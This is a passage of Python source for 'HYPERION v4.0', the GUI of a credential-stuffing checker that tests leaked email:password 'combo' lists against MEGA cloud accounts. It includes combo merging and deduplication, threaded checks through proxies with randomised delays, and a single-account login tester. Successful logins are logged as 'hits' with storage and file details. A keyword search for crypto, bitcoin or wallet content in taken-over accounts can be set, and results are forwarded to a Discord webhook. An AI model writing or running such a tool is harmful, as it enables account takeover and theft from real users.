            scrollbar_button_hover_color=HackerTheme.PRIMARY_DARK
        )
        self.terminal.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Terminal header
        self.terminal.insert("1.0", f"""
╔══════════════════════════════════════════════════════════════════════╗
║  HYPERION v4.0 - Professional Cybersecurity Testing Suite           ║
║  Terminal Initialized - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}                          ║
╚══════════════════════════════════════════════════════════════════════╝

""")
        self.terminal.configure(state="disabled")
    
    def create_section_header(self, parent, title):
        """Create a section header"""
        header = ctk.CTkLabel(
            parent,
            text=title,
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=(15, 10))
    
    def create_setting_row(self, parent, label, default_value, attr_name):
        """Create a settings input row"""
        row_frame = ctk.CTkFrame(parent, fg_color="transparent")
        row_frame.pack(fill="x", padx=15, pady=5)
        
        ctk.CTkLabel(
            row_frame,
            text=label,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=HackerTheme.TEXT_SECONDARY
        ).pack(side="left")
        
        entry = ctk.CTkEntry(
            row_frame,
            width=80,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY
        )
        entry.pack(side="right")
        entry.insert(0, default_value)
        setattr(self, attr_name, entry)
    
    def log_terminal(self, message: str, level: str = "info"):
        """Log message to terminal with color coding"""
        colors = {
            "info": HackerTheme.TEXT_PRIMARY,
            "success": HackerTheme.SUCCESS,
            "warning": HackerTheme.WARNING,
            "error": HackerTheme.ERROR,
            "hit": HackerTheme.SUCCESS,
            "fail": HackerTheme.ERROR
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        self.terminal.configure(state="normal")
        self.terminal.insert("end", f"[{timestamp}] {message}\n")
        self.terminal.configure(state="disabled")
        self.terminal.see("end")
        
        # Safe logging for Windows compatibility
        try:
            # First try to log with full Unicode support
            logger.info(message)
        except UnicodeEncodeError:
            # Fallback: remove problematic characters
            safe_message = message.encode('ascii', 'ignore').decode('ascii')
            logger.info(f"[SAFE] {safe_message}")
        except Exception:
            # Ultimate fallback
            logger.info("Log message contains unsupported characters")
    
    def clear_terminal(self):
        """Clear the terminal display"""
        self.terminal.configure(state="normal")
        self.terminal.delete("1.0", "end")
        self.terminal.configure(state="disabled")
        self.log_terminal("Terminal cleared", "info")
    
    def update_stats(self):
        """Update statistics display with enhanced turbo metrics"""
        # Use the modern stats update method instead
        self.update_modern_stats()
        
        # Update hits categorization display
        self.update_hits_display()
        
    def open_tools_menu(self):
        """Open tools menu with merge combos, remove duplicates, etc."""
        dialog = ctk.CTkToplevel(self)
        dialog.title("🛠️ HYPERION Tools")
        dialog.geometry("600x500")
        dialog.configure(fg_color=HackerTheme.BG_MAIN)
        dialog.transient(self)
        dialog.grab_set()
        
        # Center dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (300)
        y = (dialog.winfo_screenheight() // 2) - (250)
        dialog.geometry(f"600x500+{x}+{y}")
        
        # Title
        title_label = ctk.CTkLabel(
            dialog,
            text="🛠️ HYPERION TOOLS",
            font=ctk.CTkFont(family="Consolas", size=18, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        title_label.pack(pady=20)
        
        # Tools frame
        tools_frame = ctk.CTkScrollableFrame(
            dialog,
            width=550,
            height=350,
            fg_color=HackerTheme.BG_ELEVATED,
            border_width=1,
            border_color=HackerTheme.BORDER_MAIN
        )
        tools_frame.pack(pady=10, padx=25, fill="both", expand=True)
        
        # Tool buttons
        tools = [
            ("📋 MERGE COMBOS", "Combine multiple combo files into one", self.merge_combos),
            ("🗂️ REMOVE DUPLICATES", "Remove duplicate accounts from combo", self.remove_duplicates),
            ("📊 ANALYZE COMBO", "Analyze combo file structure and quality", self.analyze_combo),
            ("🔄 RESUME CHECKER", "Resume checking from specific position", self.setup_resume),
            ("🔍 KEYWORD SETUP", "Configure keyword search for accounts", self.setup_keyword_search),
            ("🎯 EXPORT FORMATS", "Configure export formats (TXT/JSON/CSV)", self.setup_export_formats),
            ("📈 PROGRESS TRACKER", "View detailed progress and statistics", self.show_progress_tracker)
        ]
        
        for tool_name, description, command in tools:
            tool_container = ctk.CTkFrame(tools_frame, fg_color="transparent")
            tool_container.pack(fill="x", pady=5)
            
            tool_btn = ctk.CTkButton(
                tool_container,
                text=tool_name,
                font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
                fg_color="#ff6600",
                hover_color="#cc5200",
                text_color="white",
                width=200,
                height=35,
                command=command
            )
            tool_btn.pack(side="left", padx=(0, 10))
            
            desc_label = ctk.CTkLabel(
                tool_container,
                text=description,
                font=ctk.CTkFont(family="Segoe UI", size=11),
                text_color=HackerTheme.TEXT_SECONDARY
            )
            desc_label.pack(side="left", fill="x", expand=True)
        
        # Close button
        close_btn = ctk.CTkButton(
            dialog,
            text="❌ CLOSE",
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0000",
            text_color="white",
            width=100,
            command=dialog.destroy
        )
        close_btn.pack(pady=10)
        
    def open_settings_menu(self):
        """Open settings configuration menu"""
        dialog = ctk.CTkToplevel(self)
        dialog.title("⚙️ HYPERION Settings")
        dialog.geometry("700x600")
        dialog.configure(fg_color=HackerTheme.BG_MAIN)
        dialog.transient(self)
        dialog.grab_set()
        
        # Center dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (350)
        y = (dialog.winfo_screenheight() // 2) - (300)
        dialog.geometry(f"700x600+{x}+{y}")
        
        # Title
        title_label = ctk.CTkLabel(
            dialog,
            text="⚙️ HYPERION CONFIGURATION",
            font=ctk.CTkFont(family="Consolas", size=18, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        title_label.pack(pady=20)
        
        # Settings frame
        settings_frame = ctk.CTkScrollableFrame(
            dialog,
            width=650,
            height=450,
            fg_color=HackerTheme.BG_ELEVATED,
            border_width=1,
            border_color=HackerTheme.BORDER_MAIN
        )
        settings_frame.pack(pady=10, padx=25, fill="both", expand=True)
        
        # Discord Webhook Section
        webhook_frame = ctk.CTkFrame(settings_frame, fg_color=HackerTheme.BG_MAIN)
        webhook_frame.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(
            webhook_frame,
            text="🔗 Discord Webhook URL",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color=HackerTheme.SUCCESS
        ).pack(pady=5)
        
        webhook_entry = ctk.CTkEntry(
            webhook_frame,
            width=600,
            height=35,
            font=ctk.CTkFont(family="Consolas", size=11),
            placeholder_text="https://discord.com/api/webhooks/...",
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY
        )
        webhook_entry.pack(pady=5)
        webhook_entry.insert(0, self.settings.get('webhook_url', ''))
        
        # Keyword Search Section
        keyword_frame = ctk.CTkFrame(settings_frame, fg_color=HackerTheme.BG_MAIN)
        keyword_frame.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(
            keyword_frame,
            text="🔍 Keyword Search",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color=HackerTheme.ACCENT
        ).pack(pady=5)
        
        keyword_entry = ctk.CTkEntry(
            keyword_frame,
            width=600,
            height=35,
            font=ctk.CTkFont(family="Consolas", size=11),
            placeholder_text="Enter keyword to search in account files (e.g., crypto, bitcoin, wallet)",
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY
        )
        keyword_entry.pack(pady=5)
        keyword_entry.insert(0, self.settings.get('keyword_search', ''))
        
        # Resume Position Section
        resume_frame = ctk.CTkFrame(settings_frame, fg_color=HackerTheme.BG_MAIN)
        resume_frame.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(
            resume_frame,
            text="🔄 Resume Position",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color="#ffaa00"
        ).pack(pady=5)
        
        resume_entry = ctk.CTkEntry(
            resume_frame,
            width=200,
            height=35,
            font=ctk.CTkFont(family="Consolas", size=11),
            placeholder_text="0",
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY
        )
        resume_entry.pack(pady=5)
        resume_entry.insert(0, str(self.settings.get('resume_position', 0)))
        
        # Export Format Section
        export_frame = ctk.CTkFrame(settings_frame, fg_color=HackerTheme.BG_MAIN)
        export_frame.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(
            export_frame,
            text="💾 Export Format",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color="#cc00ff"
        ).pack(pady=5)
        
        export_var = ctk.StringVar(value=self.settings.get('export_format', 'txt'))
        export_menu = ctk.CTkOptionMenu(
            export_frame,
            values=["txt", "json", "csv"],
            variable=export_var,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=HackerTheme.PRIMARY,
            button_color=HackerTheme.PRIMARY_HOVER,
            dropdown_fg_color=HackerTheme.BG_ELEVATED
        )
        export_menu.pack(pady=5)
        
        # Performance Settings
        perf_frame = ctk.CTkFrame(settings_frame, fg_color=HackerTheme.BG_MAIN)
        perf_frame.pack(fill="x", pady=10, padx=10)
        
        ctk.CTkLabel(
            perf_frame,
            text="⚡ Performance Settings",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color="#00ccff"
        ).pack(pady=5)
        
        # Max retries
        retry_label = ctk.CTkLabel(perf_frame, text="Max Retries:", font=ctk.CTkFont(size=11))
        retry_label.pack(pady=2)
        retry_slider = ctk.CTkSlider(perf_frame, from_=1, to=5, number_of_steps=4)
        retry_slider.set(self.settings.get('max_retries', 2))
        retry_slider.pack(pady=2)
        
        # Proxy timeout
        timeout_label = ctk.CTkLabel(perf_frame, text="Proxy Timeout (seconds):", font=ctk.CTkFont(size=11))
        timeout_label.pack(pady=2)
        timeout_slider = ctk.CTkSlider(perf_frame, from_=5, to=30, number_of_steps=25)
        timeout_slider.set(self.settings.get('proxy_timeout', 10))
        timeout_slider.pack(pady=2)
        
        # Save function
        def save_settings():
            self.settings['webhook_url'] = webhook_entry.get().strip()
            self.settings['keyword_search'] = keyword_entry.get().strip()
            self.settings['resume_position'] = int(resume_entry.get()) if resume_entry.get().isdigit() else 0
            self.settings['export_format'] = export_var.get()
            self.settings['max_retries'] = int(retry_slider.get())
            self.settings['proxy_timeout'] = int(timeout_slider.get())
            
            self.log_terminal("⚙️ Settings saved successfully!", "success")
            
            # Send test webhook if URL provided
            if self.settings['webhook_url']:
                self.send_webhook_notification("✅ HYPERION settings configured successfully!", 0x00ff00)
            
            dialog.destroy()
        
        # Buttons
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(pady=10)
        
        save_btn = ctk.CTkButton(
            button_frame,
            text="💾 SAVE SETTINGS",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00cc33",
            text_color="white",
            width=150,
            command=save_settings
        )
        save_btn.pack(side="left", padx=(0, 10))
        
        cancel_btn = ctk.CTkButton(
            button_frame,
            text="❌ CANCEL",
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0000",
            text_color="white",
            width=100,
            command=dialog.destroy
        )
        cancel_btn.pack(side="left")
        
    def merge_combos(self):
        """Merge multiple combo files"""
        from tkinter import filedialog, messagebox
        
        files = filedialog.askopenfilenames(
            title="Select Combo Files to Merge",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not files:
            return
            
        merged_lines = []
        total_lines = 0
        
        for file_path in files:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f.readlines() if line.strip() and ':' in line]
                    merged_lines.extend(lines)
                    total_lines += len(lines)
                    self.log_terminal(f"📋 Loaded {len(lines)} from {file_path.split('/')[-1]}", "info")
            except Exception as e:
                self.log_terminal(f"❌ Error loading {file_path}: {e}", "error")
        
        # Remove duplicates
        original_count = len(merged_lines)
        merged_lines = list(set(merged_lines))
        duplicates_removed = original_count - len(merged_lines)
        
        # Save merged file
        output_file = filedialog.asksaveasfilename(
            title="Save Merged Combo",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write('\\n'.join(merged_lines))
                
                self.log_terminal(f"✅ Merged {len(files)} files into {output_file.split('/')[-1]}", "success")
                self.log_terminal(f"📊 Total: {len(merged_lines)} lines ({duplicates_removed} duplicates removed)", "info")
                
                messagebox.showinfo("Merge Complete", f"Successfully merged {len(files)} files\\n{len(merged_lines)} unique accounts\\n{duplicates_removed} duplicates removed")
                
            except Exception as e:
                self.log_terminal(f"❌ Error saving merged file: {e}", "error")
                
    def remove_duplicates(self):
        """Remove duplicates from combo file"""
        from tkinter import filedialog, messagebox
        
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not file_path:
            return
            
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            
            original_count = len(lines)
            unique_lines = list(set(lines))
            duplicates_removed = original_count - len(unique_lines)
            
            # Save cleaned file
            output_file = filedialog.asksaveasfilename(
                title="Save Cleaned Combo",
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt")],
                initialvalue=f"cleaned_{file_path.split('/')[-1]}"
            )
            
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write('\\n'.join(unique_lines))
                
                self.log_terminal(f"🗂️ Removed {duplicates_removed} duplicates", "success")
                self.log_terminal(f"📊 Original: {original_count} → Clean: {len(unique_lines)}", "info")
                
                messagebox.showinfo("Cleanup Complete", f"Removed {duplicates_removed} duplicates\\nClean file: {len(unique_lines)} unique accounts")
                
        except Exception as e:
            self.log_terminal(f"❌ Error processing file: {e}", "error")
            
    def analyze_combo(self):
        """Analyze combo file structure and quality"""
        from tkinter import filedialog
        
        file_path = filedialog.askopenfilename(
            title="Select Combo File to Analyze",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not file_path:
            return
            
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            
            self.log_terminal("📊 COMBO ANALYSIS REPORT", "success")
            self.log_terminal("=" * 50, "info")
            
            total_lines = len(lines)
            valid_format = sum(1 for line in lines if ':' in line and len(line.split(':')) >= 2)
            invalid_format = total_lines - valid_format
            
            # Domain analysis
            domains = {}
            for line in lines:
                if ':' in line:
                    email_part = line.split(':')[0]
                    if '@' in email_part:
                        domain = email_part.split('@')[-1].lower()
                        domains[domain] = domains.get(domain, 0) + 1
            
            # Length analysis
            avg_length = sum(len(line) for line in lines) / len(lines) if lines else 0
            
            self.log_terminal(f"📈 Total Lines: {total_lines:,}", "info")
            self.log_terminal(f"✅ Valid Format: {valid_format:,} ({valid_format/total_lines*100:.1f}%)", "success")
            self.log_terminal(f"❌ Invalid Format: {invalid_format:,} ({invalid_format/total_lines*100:.1f}%)", "error" if invalid_format > 0 else "info")
            self.log_terminal(f"📏 Average Line Length: {avg_length:.1f} chars", "info")
            
            # Top domains
            if domains:
                self.log_terminal("🌐 Top Email Domains:", "info")
                sorted_domains = sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10]
                for domain, count in sorted_domains:
                    percentage = (count / valid_format) * 100 if valid_format > 0 else 0
                    self.log_terminal(f"   {domain}: {count:,} ({percentage:.1f}%)", "info")
            
            self.log_terminal("=" * 50, "info")
            
        except Exception as e:
            self.log_terminal(f"❌ Error analyzing file: {e}", "error")
            
    def setup_resume(self):
        """Setup resume position for checking"""
        dialog = ctk.CTkInputDialog(
            text="Enter position to resume from (0 = start):",
            title="Resume Position"
        )
        position = dialog.get_input()
        
        if position and position.isdigit():
            self.settings['resume_position'] = int(position)
            self.log_terminal(f"🔄 Resume position set to: {position}", "success")
        
    def setup_keyword_search(self):
        """Setup keyword search"""
        dialog = ctk.CTkInputDialog(
            text="Enter keyword to search in accounts:",
            title="Keyword Search Setup"
        )
        keyword = dialog.get_input()
        
        if keyword:
            self.settings['keyword_search'] = keyword.strip()
            self.log_terminal(f"🔍 Keyword search set to: '{keyword}'", "success")
            
    def setup_export_formats(self):
        """Setup export formats"""
        self.log_terminal("💾 Export formats: TXT, JSON, CSV available", "info")
        self.log_terminal("📝 Configure in Settings menu", "info")
        
    def show_progress_tracker(self):
        """Show detailed progress tracker"""
        total = len(self.combo_data) if hasattr(self, 'combo_data') else 0
        checked = self.stats.get('checked', 0)
        hits = self.stats.get('hits', 0)
        fails = self.stats.get('fails', 0)
        
        progress = (checked / total * 100) if total > 0 else 0
        
        self.log_terminal("📈 DETAILED PROGRESS TRACKER", "success")
        self.log_terminal("=" * 50, "info")
        self.log_terminal(f"📊 Progress: {progress:.2f}% ({checked:,}/{total:,})", "info")
        self.log_terminal(f"✅ Hits: {hits:,} ({hits/checked*100:.1f}% hit rate)" if checked > 0 else "✅ Hits: 0", "success")
        self.log_terminal(f"❌ Fails: {fails:,} ({fails/checked*100:.1f}% fail rate)" if checked > 0 else "❌ Fails: 0", "error")
        
        if hasattr(self, 'start_time') and self.start_time:
            elapsed = time.time() - self.start_time
            rate = checked / elapsed * 60 if elapsed > 0 else 0
            eta = (total - checked) / (rate / 60) if rate > 0 else 0
            
            self.log_terminal(f"⏱️ Speed: {rate:.1f} accounts/min", "info")
            self.log_terminal(f"⏳ ETA: {eta/60:.1f} minutes remaining", "info")
        
        self.log_terminal("=" * 50, "info")
    
    def load_combo_file(self):
        """Load and analyze combo file"""
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not file_path:
            return
        
        self.log_terminal("🔍 Analyzing combo file...", "info")
        
        # AI analysis
        analysis = self.ai.analyze_combo(file_path)
        
        if 'error' in analysis:
            self.log_terminal(f"❌ Analysis failed: {analysis['error']}", "error")
            return
        
        # Store cleaned data
        self.combo_data = analysis['cleaned_lines']
        self.stats['total'] = len(self.combo_data)
        self.update_stats()
        
        # Update combo info display
        self.combo_info.configure(state="normal")
        self.combo_info.delete("1.0", "end")
        
        info_text = f"""> File: {Path(file_path).name}
> Original Lines: {analysis['original']:,}
> Valid Accounts: {analysis['valid']:,}
> Duplicates Removed: {analysis['duplicates']:,}
> Quality Score: {analysis['quality_score']}%
> Status: {analysis['status']}
> Ready for scanning"""
        
        self.combo_info.insert("1.0", info_text)
        self.combo_info.configure(state="disabled")
        
        # Log results
        self.log_terminal(f"✅ Combo loaded: {analysis['valid']:,} accounts", "success")
        self.log_terminal(f"🧹 Auto-removed {analysis['duplicates']:,} duplicates", "info")
        self.log_terminal(f"📊 Quality: {analysis['status']} ({analysis['quality_score']}%)", "success")
    
    def merge_combo_files(self):
        """Merge multiple combo files"""
        file_paths = filedialog.askopenfilenames(
            title="Select Combo Files to Merge",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not file_paths:
            return
        
        self.log_terminal(f"🔗 Merging {len(file_paths)} files...", "info")
        
        all_lines = []
        total_original = 0
        
        for file_path in file_paths:
            analysis = self.ai.analyze_combo(file_path)
            if 'error' not in analysis:
                all_lines.extend(analysis['cleaned_lines'])
                total_original += analysis['original']
                self.log_terminal(f"  📁 {Path(file_path).name}: {analysis['valid']:,} valid", "info")
        
        # Remove duplicates across all files
        unique_lines = list(set(all_lines))
        duplicates_removed = len(all_lines) - len(unique_lines)
        
        # Store merged data
        self.combo_data = unique_lines
        self.stats['total'] = len(self.combo_data)
        self.update_stats()
        
        # Update display
        self.combo_info.configure(state="normal")
        self.combo_info.delete("1.0", "end")
        
        info_text = f"""> Merged {len(file_paths)} files
> Total Original: {total_original:,}
> After Cleaning: {len(all_lines):,}
> After Deduplication: {len(unique_lines):,}
> Cross-file Duplicates: {duplicates_removed:,}
> Ready for scanning"""
        
        self.combo_info.insert("1.0", info_text)
        self.combo_info.configure(state="disabled")
        
        self.log_terminal(f"✅ Merged combo: {len(unique_lines):,} unique accounts", "success")
        self.log_terminal(f"🧹 Removed {duplicates_removed:,} cross-file duplicates", "info")
        
        # Save merged file
        save_path = filedialog.asksaveasfilename(
            title="Save Merged Combo",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        
        if save_path:
            with open(save_path, 'w', encoding='utf-8') as f:
                for line in unique_lines:
                    f.write(line + '\n')
            self.log_terminal(f"💾 Saved merged combo: {Path(save_path).name}", "success")
    
    def start_checking(self):
        """Start the checking process"""
        if not self.combo_data:
            messagebox.showwarning("No Combo", "Please load a combo file first")
            return
        
        # Get settings
        try:
            threads = int(self.threads_entry.get())
            min_delay = float(self.min_delay_entry.get())
            max_delay = float(self.max_delay_entry.get())
        except ValueError:
            messagebox.showerror("Invalid Settings", "Please check your numeric settings")
            return
        
        # UI updates
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.status_label.configure(text="SCANNING", text_color=HackerTheme.WARNING)
        
        # Reset stats
        self.stats.update({
            'checked': 0, 'hits': 0, 'fails': 0, 'errors': 0,
            'start_time': time.time(), 'rate': 0
        })
        
        # Initialize checker
        self.checker = MEGAChecker(
            progress_callback=self.on_progress,
            log_callback=self.log_terminal
        )
        
        self.log_terminal(f"🚀 Starting scan: {len(self.combo_data):,} accounts", "success")
        self.log_terminal(f"⚙️ Threads: {threads} | Delay: {min_delay}-{max_delay}s | Proxies: {'ON' if self.proxy_var.get() else 'OFF'}", "info")
        
        # Start checking thread
        self.checking_thread = threading.Thread(
            target=self.checker.check_combo_list,
            args=(self.combo_data, self.proxy_var.get(), threads, (min_delay, max_delay)),
            daemon=True
        )
        self.checking_thread.start()
    
    def stop_checking(self):
        """Stop the checking process and prevent restart loops"""
        self.log_terminal("🛑 Stop requested by user...", "warning")
        
        # Set completion flag to prevent restart
        self._scan_completed = True
        
        # Stop the CheckerEngine directly
        if self.checker and hasattr(self.checker, 'checker_engine') and self.checker.checker_engine:
            self.checker.checker_engine.stop_checking()
            self.log_terminal("⏹️ CheckerEngine stopped", "info")
        
        # Stop MEGAChecker
        if self.checker:
            self.checker.stop_checking()
            
        # Stop turbo checking if running
        if hasattr(self, 'is_checking_turbo') and self.is_checking_turbo:
            self.is_checking_turbo = False
            
        # Shutdown executor
        if hasattr(self, 'executor') and self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None
            
        # Stop any background threads
        if hasattr(self, 'checking_thread') and self.checking_thread and self.checking_thread.is_alive():
            # Give thread time to stop gracefully
            self.checking_thread.join(timeout=2)
            
        # Reset UI state
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.status_label.configure(text="STOPPED", text_color=HackerTheme.ERROR)
        
        self.log_terminal("✅ Checking stopped successfully", "success")
        
        # Update UI state
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        if hasattr(self, 'status_label'):
            self.status_label.configure(text="STOPPED", text_color=HackerTheme.ERROR)
        
        self.log_terminal("🛑 Scan stopped by user", "warning")
        self.log_terminal(f"✅ Final Results: {len(self.hits)} hits found", "success")
    
    def single_account_check(self):
        """Check a single MEGA account"""
        # Create input dialog
        dialog = ctk.CTkToplevel(self)
        dialog.title("Single Account Check")
        dialog.geometry("500x300")
        dialog.configure(fg_color=HackerTheme.BG_MAIN)
        dialog.transient(self)
        dialog.grab_set()
        
        # Center dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (500 // 2)
        y = (dialog.winfo_screenheight() // 2) - (300 // 2)
        dialog.geometry(f"500x300+{x}+{y}")
        
        # Title
        title_label = ctk.CTkLabel(
            dialog,
            text="🔍 SINGLE ACCOUNT CHECK",
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        title_label.pack(pady=20)
        
        # Email input
        ctk.CTkLabel(
            dialog,
            text="Email:",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=HackerTheme.TEXT_SECONDARY
        ).pack(pady=(10, 5))
        
        email_entry = ctk.CTkEntry(
            dialog,
            width=300,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY,
            placeholder_text="Enter email address"
        )
        email_entry.pack(pady=(0, 10))
        
        # Password input
        ctk.CTkLabel(
            dialog,
            text="Password:",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=HackerTheme.TEXT_SECONDARY
        ).pack(pady=(10, 5))
        
        password_entry = ctk.CTkEntry(
            dialog,
            width=300,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=HackerTheme.BG_INPUT,
            text_color=HackerTheme.TEXT_PRIMARY,
            placeholder_text="Enter password",
            show="*"
        )
        password_entry.pack(pady=(0, 20))
        
        # Result display
        result_display = ctk.CTkTextbox(
            dialog,
            width=450,
            height=100,
            font=ctk.CTkFont(family="Consolas", size=10),
            fg_color=HackerTheme.BG_TERMINAL,
            text_color=HackerTheme.TEXT_PRIMARY,
            border_width=1,
            border_color=HackerTheme.BORDER_GLOW
        )
        result_display.pack(pady=(0, 20))
        result_display.insert("1.0", "Enter credentials and click CHECK to test account")
        result_display.configure(state="disabled")
        
        def perform_check():
            email = email_entry.get().strip()
            password = password_entry.get().strip()
            
            if not email or not password:
                result_display.configure(state="normal")
                result_display.delete("1.0", "end")
                result_display.insert("1.0", "❌ Please enter both email and password")
                result_display.configure(state="disabled")
                return
            
            # Show checking status
            result_display.configure(state="normal")
            result_display.delete("1.0", "end")
            result_display.insert("1.0", "🔍 Checking account, please wait...")
            result_display.configure(state="disabled")
            dialog.update()
            
            # Perform check in thread to prevent UI freeze
            def check_thread():
                try:
                    if not self.checker:
                        self.checker = MEGAChecker()
                    
                    # Use synchronous single account check
                    check_result = self.checker.check_single_account_sync(email, password)
                    
                    # Update UI with results
                    def update_ui():
                        result_display.configure(state="normal")
                        result_display.delete("1.0", "end")
                        
                        if check_result['success']:
                            result_text = f"""✅ LOGIN SUCCESSFUL!

📧 Email: {check_result['email']}
🔑 Password: {check_result['password']}
💾 Storage Used: {check_result['used_space']:.2f} GB
📊 Total Space: {check_result['total_space']:.2f} GB
📁 File Count: {check_result['file_count']:,}
🎯 Account Type: {check_result['account_type']}

Status: VALID ACCOUNT"""
                        else:
                            result_text = f"""❌ LOGIN FAILED

📧 Email: {check_result['email']}
🔑 Password: {check_result['password']}
❗ Error: {check_result.get('error', 'Unknown error')}

Status: INVALID CREDENTIALS"""
                        
                        result_display.insert("1.0", result_text)
                        result_display.configure(state="disabled")
                    
                    # Schedule UI update in main thread
                    dialog.after(0, update_ui)
                    
                except Exception as e:
                    def show_error():
                        result_display.configure(state="normal")
                        result_display.delete("1.0", "end")
                        result_display.insert("1.0", f"❌ CHECK FAILED\n\nError: {str(e)}")
                        result_display.configure(state="disabled")
                    
                    dialog.after(0, show_error)
            
            # Start check thread
            threading.Thread(target=check_thread, daemon=True).start()
        
        # Buttons
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(pady=10)
        
        # CHECK button
        check_btn = ctk.CTkButton(
            button_frame,
            text="🔍 CHECK ACCOUNT",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            fg_color=HackerTheme.PRIMARY,
            hover_color=HackerTheme.PRIMARY_HOVER,
            text_color="white",
            width=150,
            height=35,
            command=perform_check
        )
        check_btn.pack(side="left", padx=(0, 10))
        
        # CLOSE button
        close_btn = ctk.CTkButton(
            button_frame,
            text="❌ CLOSE",
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0000",
            text_color="white",
            width=100,
            height=35,
            command=dialog.destroy
        )
        close_btn.pack(side="left")
        
        check_btn = ctk.CTkButton(
            button_frame,
            text="🔍 CHECK",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00cc00",
            text_color=HackerTheme.BG_MAIN,
            width=120,
            command=perform_check
        )
        check_btn.pack(side="left", padx=(0, 10))
        
        close_btn = ctk.CTkButton(
            button_frame,
            text="❌ CLOSE",
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0033",
            text_color="white",
            width=120,
            command=dialog.destroy
        )
        close_btn.pack(side="left")
        
        # Focus on email entry
        email_entry.focus()
    
    def on_progress(self, checked: int, total: int, result: CheckResult):
        """Handle progress updates from CheckerEngine"""
        # Check if checking was stopped to prevent restart loops
        if hasattr(self, 'checker') and self.checker and hasattr(self.checker, 'stop_flag') and self.checker.stop_flag:
            return
            
        # Get real stats from CheckerEngine if available
        if self.checker and self.checker.checker_engine:
            engine = self.checker.checker_engine
            # Only update if values are increasing to prevent resets
            if engine.checked >= self.stats.get('checked', 0):
                self.stats['checked'] = engine.checked
                self.stats['hits'] = engine.hits
                self.stats['fails'] = engine.fails
                self.stats['errors'] = engine.customs  # Use customs as errors
        else:
            # Fallback to old method if CheckerEngine not available
            self.stats['checked'] = checked
            if result.status == 'hit':
                self.stats['hits'] += 1
                # Categorize the hit
                self.categorize_hit(result)
                
                # Log categorized hit
                category = getattr(result, 'account_type', 'UNKNOWN')
                storage = getattr(result, 'storage_used', 'Unknown')
                
                # Enhanced hit logging with keyword search
                hit_message = f"✅ HIT [{category}]: {result.email} | {storage}"
                
                # Check for keyword if configured
                if self.settings.get('keyword_search'):
                    # This would be implemented in the actual checking process
